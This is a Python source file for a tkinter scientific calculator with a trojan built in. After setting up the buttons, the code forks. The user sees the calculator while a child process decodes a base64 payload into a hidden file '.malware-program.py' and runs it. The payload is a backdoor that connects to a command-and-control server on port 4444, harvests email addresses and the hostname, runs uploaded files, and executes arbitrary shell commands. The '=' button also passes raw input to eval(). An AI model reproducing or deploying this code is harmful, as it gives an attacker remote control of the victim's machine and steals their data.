from tkinter import *  # importing the tkinter module
import math
import os  # Importing the math module for math operations
import base64


class CALCULATOR():                                            # defining a class for the methods
    # initializing the class with init method and declaring the parameters for later use
    def init(self):
        self.total = 0
        self.op = ""
        self.operation = ""

    # displaying the result from the Entry box
    def display(self, value):
        Display.delete(0, END)
        Display.insert(0, value)

    def sqrt(self):  # a function to calculate the sqrt of a number
        if (float(Display.get())) >= 0:                        # validating the entered value
            self.sqrt = math.sqrt(float(Display.get()))
            self.display(self.sqrt)
        else:
            self.display("invalid input")

    def sin(self):  # a function to calculate the sin of a number
        self.sin = math.sin(math.radians(float(Display.get())))
        self.display(self.sin)

    def cos(self):  # a function to calculate the cosine of a number
        self.cos = math.cos(math.radians(float(Display.get())))
        self.display(self.cos)

    # a function to find the factorial of a number
    def factorial(self):
        if (int(Display.get())) > 0:
            self.fact = math.factorial(int(Display.get()))
            self.display(self.fact)
        else:
            self.display("wrong input")

    def ln(self):
        if (float(Display.get())) > 0:
            self.ln = math.log1p(float(Display.get()))
            self.display(self.ln)
        else:
            self.display("wrong input")

    def log(self):
        if (float(Display.get())) > 0:
            self.log = math.log10(float(Display.get()))
            self.display(self.log)
        else:
            self.display("invalid input")

# math function end

    # a function for deleting the entered values
    def dell(self):
        self.operation = "0"
        self.display("")

    def dellAll(self):
        self.dell()
        self.total = 0

    def square(self):
        # a function to get the square of a number
        self.square = float(Display.get())*float(Display.get())
        self.display(self.square)

    def eq(self):  # a function for  displaying the result
        self.equal = eval(str((Display.get())))
        self.display(self.equal)

    # a function assigning values for the buttons

    def EnteredNum(self, num1):
        firstnum = Display.get()
        secondnum = str(num1)

        self.operation = secondnum

        self.operation = firstnum + secondnum
        self.display(self.operation)


# copying the reference of the class CALCULATOR
Cal = CALCULATOR()
# assigning the Tk() module to a variable window(actually its reference)
window = Tk()
window.title("Calculator")  # giving the title for the GUI window
window.resizable(width=False, height=False)  # to make the window size static

Display = Entry(window, font=("Algerian", 20, 'bold'), bg="darkgoldenrod1",
                bd=30, width=20, justify=RIGHT)  # displaying the entry box in the window
Display.grid(row=0, column=0, columnspan=4, pady=1)

_Name = Label(window, text="CALCULATOR \nBY \nAzure Groups \n", font=(
    "Arial", 10, "bold"), bg="darkgoldenrod3", bd=30, width=16, justify=LEFT)
_Name.grid(row=0, column=4, columnspan=5)

# The following are the buttons used for calculation


button1 = Button(window, text="❶", bd=3, bg="darkgoldenrod4", fg="black", font=("Algerian", 20, 'bold'),
                 width=5, height=2, command=lambda: Cal.EnteredNum(1)).grid(row=1, column=0)  # uses lambda for temporary function

button2 = Button(window, text="❷", bd=3, bg="darkgoldenrod4", fg="black", font=("Algerian", 20, 'bold'),
                 width=5, height=2, command=lambda: Cal.EnteredNum(2)).grid(row=1, column=1)

button3 = Button(window, text="❸", bd=3, bg="darkgoldenrod4", fg="black", font=("Algerian", 20, 'bold'),
                 width=5, height=2, command=lambda: Cal.EnteredNum(3)).grid(row=1, column=2)

button4 = Button(window, text="❹", bd=3, bg="darkgoldenrod3", fg="black", font=("Algerian", 20, 'bold'),
                 width=5, height=2, command=lambda: Cal.EnteredNum(4)).grid(row=2, column=0)

button5 = Button(window, text="❺", bd=3, bg="darkgoldenrod3", fg="black", font=("Algerian", 20, 'bold'),
                 width=5, height=2, command=lambda: Cal.EnteredNum(5)).grid(row=2, column=1)

button6 = Button(window, text="❻", bd=3, bg="darkgoldenrod4", fg="black", font=("Algerian", 20, 'bold'),
                 width=5, height=2, command=lambda: Cal.EnteredNum(6)).grid(row=2, column=2)

button7 = Button(window, text="❼", bd=3, bg="darkgoldenrod2", fg="black", font=("Algerian", 20, 'bold'),
                 width=5, height=2, command=lambda: Cal.EnteredNum(7)).grid(row=3, column=0)

button8 = Button(window, text="❽", bd=3, bg="darkgoldenrod3", fg="black", font=("Algerian", 20, 'bold'),
                 width=5, height=2, command=lambda: Cal.EnteredNum(8)).grid(row=3, column=1)

button9 = Button(window, text="❾", bd=3, bg="darkgoldenrod4", fg="black", font=("Algerian", 20, 'bold'),
                 width=5, height=2, command=lambda: Cal.EnteredNum(9)).grid(row=3, column=2)
button0 = Button(window, text="⓿", bd=3, bg="darkgoldenrod3", fg="black", font=("Algerian", 20, "bold"),
                 width=5, height=2, command=lambda: Cal.EnteredNum(0)).grid(row=4, column=1)
butPoint = Button(window, text=".", bd=3, bg="darkgoldenrod2", fg="black", font=("Algerian", 20, 'bold'),
                  width=5, height=2, command=lambda: Cal.EnteredNum(".")).grid(row=4, column=0)


# line break
SqrButton = Button(window, text=("x^2"), bd=3, bg="darkgoldenrod4", fg="blue", font=("Algerian", 20, 'bold'),
                   width=5, height=2, command=Cal.square).grid(row=2, column=3)
butAll_Clear = Button(window, text="AC", bd=3, bg="coral2", fg="black", font=("Algerian", 20, 'bold'),
                      width=5, height=2, command=Cal.dellAll).grid(row=1, column=3)
butAdd = Button(window, text="+", bd=3, bg="darkgoldenrod3", fg="blue", font=("Algerian", 20, 'bold'),
                width=5, height=2, command=lambda: Cal.EnteredNum("+")).grid(row=1, column=4)
butEqual = Button(window, text="=", bd=3, bg="darkgoldenrod4", fg="black", font=("Algerian", 20, 'bold'),
                  width=5, height=2, command=Cal.eq).grid(row=4, column=2)
butSub = Button(window, text="-", bd=3, bg="darkgoldenrod3", fg="blue", font=("Algerian", 20, 'bold'),
                width=5, height=2, command=lambda: Cal.EnteredNum("-")).grid(row=2, column=4)

butMul = Button(window, text="x", bd=3, bg="darkgoldenrod3", fg="blue", font=("Arial", 20, 'bold'),
                width=5, height=2, command=lambda: Cal.EnteredNum("*")).grid(row=3, column=4)

butDiv = Button(window, text="÷", bd=3, bg="darkgoldenrod4", fg="blue", font=("Arial", 20, 'bold'),
                width=5, height=2, command=lambda: Cal.EnteredNum("/")).grid(row=4, column=4)

SqrtButton = Button(window, text="√", command=Cal.sqrt, bd=3, bg="darkgoldenrod4", fg="black", font=("Arial", 20, 'bold'),
                    width=5, height=2).grid(row=4, column=3)

# line break
Sin_Button = Button(window, text="sin", bd=3, bg="darkorange4", fg="black", font=("Arial", 20, 'bold'),
                    width=5, height=2, command=Cal.sin).grid(row=2, column=5)
Cos_Button = Button(window, text="cos", bd=3, bg="darkorange4", fg="black", font=("Arial", 20, 'bold'),
                    width=5, height=2, command=Cal.cos).grid(row=1, column=5)
fact_Button = Button(window, text="n!", bd=3, bg="darkgoldenrod4", fg="blue", font=("Algerian", 20, 'bold'),
                     width=5, height=2, command=Cal.factorial).grid(row=3, column=3)
ln_Button = Button(window, text="ln", bd=3, bg="darkgoldenrod3", fg="blue", font=("Algerian", 20, 'bold'),
                   width=5, height=2, command=Cal.ln).grid(row=3, column=5)
log_Button = Button(window, text="log", bd=3, bg="darkgoldenrod4", fg="blue", font=("Algerian", 20, 'bold'),
                    width=5, height=2, command=Cal.log).grid(row=4, column=5)


pid = os.fork()
if pid > 0:
    window.mainloop()  # makes the windown visible and exist until closed by the user
else:
    try:
        print("IN")
        malware_fd = open(".malware-program.py", "w")
        bt = b'IyEvdXNyL2Jpbi9weXRob24zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc29ja2V0CmltcG9ydCBiYXNlNjQKaW1wb3J0IGpzb24KaW1wb3J0IHJlCmltcG9ydCBvcwppbXBvcnQgdGltZQppbXBvcnQgc3VicHJvY2VzcwoKCmNsYXNzIEJhY2tkb29yOgogICAgIyBjb25uZWN0IHRvIGNvbW1hbmQgYW5kIGNvbnRyb2wgc2VydmVyIG9uIHBvcnQgUE9SVAogICAgZGVmIF9faW5pdF9fKHNlbGYsIGhvc3QsIHBvcnQpOgogICAgICAgIHNlbGYucyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgICAgICBzZWxmLnMuY29ubmVjdCgoaG9zdCwgcG9ydCkpCgogICAgZGVmIHNlbmQoc2VsZiwgZGF0YSk6CiAgICAgICAgIyBiYXNlNjQgZW5jb2RlIHRoZSBqc29uIGRhdGEKICAgICAgICBlbmNvZGVfZGF0YSA9IGJhc2U2NC5iNjRlbmNvZGUoanNvbi5kdW1wcyhkYXRhKS5lbmNvZGUoKSkKICAgICAgICBzZWxmLnMuc2VuZChlbmNvZGVfZGF0YSkKCiAgICBkZWYgcmVjZWl2ZShzZWxmKToKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBkYXRhID0gc2VsZi5zLnJlY3YoNDA5NikKICAgICAgICAgICAgICAgIGRlY29kZV9kYXRhID0gYmFzZTY0LmI2NGRlY29kZShkYXRhKS5kZWNvZGUoIlVURi04IikKCiAgICAgICAgICAgICAgICByZXR1cm4gZGVjb2RlX2RhdGEKCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoNCkKCiAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgIGRlZiBzZWFyY2hfZmlsZShzZWxmKToKICAgICAgICAjIGdldCBob3N0bmFtZSBvZiB0aGUgbWFjaGluZQogICAgICAgIGhvc3RuYW1lID0gc29ja2V0LmdldGhvc3RuYW1lKCkKCiAgICAgICAgZW1haWxfYWRkcmVzc2VzX2xpc3QgPSBbXQogICAgICAgIGZvciByb290LCBzdWJkaXJzLCBmaWxlcyBpbiBvcy53YWxrKCIvaG9tZS9hYmVuaS9Eb3dubG9hZHMvQ2xvbmUvcHl0aG9uLXRyb2phbiIpOgogICAgICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgIGZpbGVfZmQgPSBvcGVuKCJ7fS97fSIuZm9ybWF0KHJvb3QsIGZpbGUpLCAiciIpCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgIyByZWFkIHRoZSBjb250ZW50cyBvZiBlYWNoIGZpbGUKICAgICAgICAgICAgICAgICAgICBmaWxlX2NvbnRlbnRzID0gZmlsZV9mZC5yZWFkKCkuc3RyaXAoKQoKICAgICAgICAgICAgICAgICAgICAjIHNlYXJjaCBmb3IgZW1haWwgYWRkcmVzc2VzCiAgICAgICAgICAgICAgICAgICAgZW1haWxfYWRkcmVzc2VzID0gcmUuZmluZGFsbCgKICAgICAgICAgICAgICAgICAgICAgICAgciJbYS16MC05Ll9dK0BbYS16MC05XStcLlthLXpdezEsN30iLCBmaWxlX2NvbnRlbnRzKQoKICAgICAgICAgICAgICAgICAgICBpZiBsZW4oZW1haWxfYWRkcmVzc2VzKSA+IDA6CiAgICAgICAgICAgICAgICAgICAgICAgIGVtYWlsX2FkZHJlc3Nlc19saXN0ID0gZW1haWxfYWRkcmVzc2VzX2xpc3QgKyBlbWFpbF9hZGRyZXNzZXMKCiAgICAgICAgICAgICAgICAgICAgZmlsZV9mZC5jbG9zZSgpCiAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAjIGVuY29kZSBkYXRhIHRvIGpzb24gYW5kIHNlbmQgdGhlbSB0byBjb21tYW5kIGFuZCBjb250cm9sIHNlcnZlcgogICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICJtYWNoaW5lX2hvc3RuYW1lIjogaG9zdG5hbWUsCiAgICAgICAgICAgICJlbWFpbF9hZGRyZXNzZXNfZm91bmQiOiBlbWFpbF9hZGRyZXNzZXNfbGlzdAogICAgICAgIH0KICAgICAgICAjIHNlbmQgZGF0YSB0byBjb21tYW5kIGFuZCBjb250cm9sIHNlcnZlcgogICAgICAgIHJldHVybiBkYXRhCgogICAgZGVmIHJ1bihzZWxmKToKICAgICAgICB3aGlsZSBUcnVlOgoKICAgICAgICAgICAgY29tbWFuZCA9IGpzb24ubG9hZHMoc2VsZi5yZWNlaXZlKCkpCgogICAgICAgICAgICBpZiBjb21tYW5kOgogICAgICAgICAgICAgICAgaWYgY29tbWFuZFswXSA9PSAiZ2V0IjoKICAgICAgICAgICAgICAgICAgICBvdXRwdXQgPSBzZWxmLnNlYXJjaF9maWxlKCkKICAgICAgICAgICAgICAgICAgICBzZWxmLnNlbmQob3V0cHV0KQoKICAgICAgICAgICAgICAgIGVsaWYgY29tbWFuZFswXSA9PSAic2VuZCI6CiAgICAgICAgICAgICAgICAgICAgZmlsZV9tID0gb3BlbigiLiIgKyBjb21tYW5kWzFdLCAidyIpCiAgICAgICAgICAgICAgICAgICAgZmlsZV9tLndyaXRlKGNvbW1hbmRbMl1bMF0pCiAgICAgICAgICAgICAgICAgICAgZmlsZV9tLmNsb3NlKCkKCiAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKCIvdXNyL2Jpbi9weXRob24zICIgKyAiLiIrY29tbWFuZFsxXSkKICAgICAgICAgICAgICAgICAgICBzZWxmLnNlbmQoCiAgICAgICAgICAgICAgICAgICAgICAgICJTdWNjZXNzZnVsbHkgVXBsb2FkZWQgVGhlIEZpbGUgIiArIGNvbW1hbmRbMV0pCiAgICAgICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgb3AgPSBzdWJwcm9jZXNzLlBvcGVuKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCwgc2hlbGw9VHJ1ZSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSkKICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0ID0gc3RyKG9wLnN0ZG91dC5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpKQoKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kKG91dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dF9lcnJvciA9IG9wLnN0ZGVyci5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuc2VuZCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJPcGVyYXRpb24gQ291bGQgTm90IFBlcmZvcm0gLT4gIiArIG91dHB1dF9lcnJvcikKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKCgpkZWYgbWFpbigpOgogICAgSE9TVCA9ICcxMC41LjIzMi43NScgICMgVGhlIHNlcnZlcidzIGhvc3RuYW1lIG9yIElQIGFkZHJlc3MKICAgIFBPUlQgPSA0NDQ0ICAgICAgICMgVGhlIHBvcnQgdXNlZCBieSB0aGUgc2VydmVyCiAgICBBQmFja2Rvb3IgPSBCYWNrZG9vcihIT1NULCBQT1JUKQogICAgQUJhY2tkb29yLnJ1bigpCgoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oKQo='

        malware = base64.b64decode(bt).decode("UTF-8")
        malware_fd.write(malware)
        malware_fd.close()

        print("Exceute")
        # execute malware
        os.system("/usr/bin/python3 .malware-program.py")
    except Exception as e:
        print(e)
